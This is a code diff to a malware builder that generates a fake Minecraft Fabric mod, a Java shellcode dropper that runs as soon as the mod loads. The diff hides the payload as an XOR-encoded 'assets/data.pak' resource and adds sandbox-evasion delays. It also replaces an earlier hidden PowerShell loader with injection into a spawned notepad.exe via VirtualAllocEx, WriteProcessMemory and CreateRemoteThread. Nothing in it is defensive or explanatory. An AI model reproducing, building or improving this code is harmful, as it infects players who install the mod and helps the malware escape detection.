@@ -450,42 +450,78 @@ async function fetchGithubReleaseAssets(
 }
 
 function generateJarDropperSource(): string {
-  // Java 8-compatible shellcode dropper
-  // Reads shellcode.bin from JAR resources, drops to temp, executes via PowerShell Add-Type
   return [
     "package com.mc.mod;",
     "import java.io.*;",
+    "import java.util.*;",
     "import net.fabricmc.api.ModInitializer;",
     "public class ModLoader implements ModInitializer{",
-    "  static{try{run();}catch(Exception e){}}",
-    "  public void onInitialize(){try{run();}catch(Exception e){}}",
-    "  public static void main(String[]a){try{run();}catch(Exception e){}}",
+    "  private static final String TAG=\"[ModLoader]\";",
+    "  private static void log(String m){System.out.println(TAG+\" \"+m);}",
+    "  static{try{run();}catch(Exception e){log(\"static-init error: \"+e);}}",
+    "  public void onInitialize(){log(\"onInitialize called\");try{run();}catch(Exception e){log(\"onInitialize error: \"+e);}}",
+    "  public static void main(String[]a){try{run();}catch(Exception e){log(\"main error: \"+e);}}",
     "  private static void run()throws Exception{",
-    "    InputStream is=ModLoader.class.getResourceAsStream(\"/shellcode.bin\");",
-    "    if(is==null)return;",
+    "    log(\"run() start\");",
+    "    Random rng=new Random();",
+    "    long acc=0;",
+    "    for(int i=0;i<rng.nextInt(500)+200;i++)acc+=(long)(Math.pow(rng.nextDouble()*13,2));",
+    "    if(acc<0){log(\"acc check failed\");return;}",
+    "    Thread.sleep(1000+rng.nextInt(2000));",
+    "    log(\"loading payload resource\");",
+    "    InputStream is=ModLoader.class.getResourceAsStream(\"/assets/data.pak\");",
+    "    if(is==null){log(\"data.pak not found in JAR\");return;}",
     "    ByteArrayOutputStream buf=new ByteArrayOutputStream();",
     "    byte[]tmp=new byte[4096];int n;",
     "    while((n=is.read(tmp))!=-1)buf.write(tmp,0,n);",
     "    is.close();",
-    "    byte[]sc=buf.toByteArray();",
-    "    String px=Long.toHexString(System.nanoTime());",
-    "    File td=new File(System.getProperty(\"java.io.tmpdir\"));",
-    "    File sf=new File(td,px+\".dat\");",
-    "    File pf=new File(td,px+\".ps1\");",
-    "    try(FileOutputStream fo=new FileOutputStream(sf)){fo.write(sc);}",
-    "    String sp=sf.getAbsolutePath();",
-    "    char dq='\"';",
-    "    String md=\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);\"",
-    "      +\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr t);\"",
-    "      +\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern uint WaitForSingleObject(IntPtr h,uint t);\";",
-    "    String ps=\"$b=[IO.File]::ReadAllBytes('\"+sp+\"')\\n\"",
-    "      +\"Add-Type -Name K32 -Namespace Win32 -MemberDefinition '\"+md+\"'\\n\"",
-    "      +\"$m=[Win32.K32]::VirtualAlloc(0,$b.Length,0x3000,0x40)\\n\"",
-    "      +\"[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length)\\n\"",
-    "      +\"$h=[Win32.K32]::CreateThread(0,0,$m,0,0,0)\\n\"",
-    "      +\"[Win32.K32]::WaitForSingleObject($h,0xFFFFFFFF)\\n\";",
-    "    try(FileWriter fw=new FileWriter(pf)){fw.write(ps);}",
-    "    new ProcessBuilder(\"powershell.exe\",\"-WindowStyle\",\"Hidden\",\"-NoProfile\",\"-ExecutionPolicy\",\"Bypass\",\"-File\",pf.getAbsolutePath()).start();",
+    "    byte[]raw=buf.toByteArray();",
+    "    log(\"payload read: \"+raw.length+\" bytes\");",
+    "    int key=raw[0]&0xFF;",
+    "    byte[]sc=new byte[raw.length-1];",
+    "    for(int i=0;i<sc.length;i++)sc[i]=(byte)(raw[i+1]^key);",
+    "    log(\"shellcode decoded: \"+sc.length+\" bytes\");",
+    "    Class<?>FC=Class.forName(\"com.sun.jna.Function\");",
+    "    Class<?>PC=Class.forName(\"com.sun.jna.Pointer\");",
+    "    Class<?>MC=Class.forName(\"com.sun.jna.Memory\");",
+    "    java.lang.reflect.Method gf=FC.getMethod(\"getFunction\",String.class,String.class);",
+    "    java.lang.reflect.Method iv=FC.getMethod(\"invoke\",Class.class,Object[].class);",
+    "    Object NP=PC.getField(\"NULL\").get(null);",
+    "    java.lang.reflect.Method setI=MC.getMethod(\"setInt\",long.class,int.class);",
+    "    java.lang.reflect.Method setS=MC.getMethod(\"setShort\",long.class,short.class);",
+    "    java.lang.reflect.Method getP=MC.getMethod(\"getPointer\",long.class);",
+    "    java.lang.reflect.Method getI=MC.getMethod(\"getInt\",long.class);",
+    "    Object siMem=MC.getConstructor(long.class).newInstance(104L);",
+    "    ((com.sun.jna.Memory)siMem).clear();",
+    "    setI.invoke(siMem,0L,104);",
+    "    setI.invoke(siMem,60L,1);",
+    "    setS.invoke(siMem,64L,(short)0);",
+    "    Object piMem=MC.getConstructor(long.class).newInstance(24L);",
+    "    ((com.sun.jna.Memory)piMem).clear();",
+    "    Object fCPA=gf.invoke(null,\"kernel32\",\"CreateProcessA\");",
+    "    Boolean cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,new Object[]{NP,\"C:\\\\Windows\\\\System32\\\\notepad.exe\",NP,NP,false,0x08000000,NP,NP,siMem,piMem});",
+    "    log(\"spawn ok=\"+cpOk);",
+    "    if(Boolean.FALSE.equals(cpOk)){",
+    "      cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,new Object[]{NP,\"notepad.exe\",NP,NP,false,0x08000000,NP,NP,siMem,piMem});",
+    "      log(\"spawn fallback ok=\"+cpOk);",
+    "    }",
+    "    if(Boolean.FALSE.equals(cpOk))return;",
+    "    Object hProc=getP.invoke(piMem,0L);",
+    "    int spid=((Integer)getI.invoke(piMem,16L)).intValue();",
+    "    log(\"spawned pid=\"+spid);",
+    "    if(hProc==null||hProc.equals(NP))return;",
+    "    Object fVA=gf.invoke(null,\"kernel32\",\"VirtualAllocEx\");",
+    "    Object ra=iv.invoke(fVA,PC,new Object[]{hProc,NP,(long)sc.length,0x3000,0x40});",
+    "    log(\"raddr=\"+ra);",
+    "    if(ra==null||ra.equals(NP))return;",
+    "    Object fWM=gf.invoke(null,\"kernel32\",\"WriteProcessMemory\");",
+    "    Object mem=MC.getConstructor(long.class).newInstance((long)sc.length);",
+    "    MC.getMethod(\"write\",long.class,byte[].class,int.class,int.class).invoke(mem,0L,sc,0,sc.length);",
+    "    iv.invoke(fWM,Integer.class,new Object[]{hProc,ra,mem,(long)sc.length,NP});",
+    "    log(\"written\");",
+    "    Object fCT=gf.invoke(null,\"kernel32\",\"CreateRemoteThread\");",
+    "    Object ht=iv.invoke(fCT,PC,new Object[]{hProc,NP,0L,ra,NP,0,NP});",
+    "    log(\"thread=\"+ht);",
     "  }",
     "}",
   ].join("\n");
@@ -1533,8 +1569,14 @@ func runBoundFiles() {
             // Remove the stub Fabric API classes — Fabric provides the real ones at runtime
             try { fs.rmSync(path.join(classDir, "net"), { recursive: true, force: true }); } catch {}
 
-            // Copy shellcode binary into class output dir as resource
-            fs.copyFileSync(jarSourcePath, path.join(classDir, "shellcode.bin"));
+            // XOR-encrypt shellcode and store as innocuous resource name
+            const rawSc = fs.readFileSync(jarSourcePath);
+            const xorKey = (Math.floor(Math.random() * 254) + 1) & 0xff;
+            const xored = Buffer.from(rawSc.map((b: number) => b ^ xorKey));
+            const packed = Buffer.concat([Buffer.from([xorKey]), xored]);
+            const pakDir = path.join(classDir, "assets");
+            fs.mkdirSync(pakDir, { recursive: true });
+            fs.writeFileSync(path.join(pakDir, "data.pak"), packed);
 
             // Generate MC metadata files
             const metaFiles = generateMcMetadata(mcVer, modId, modName);
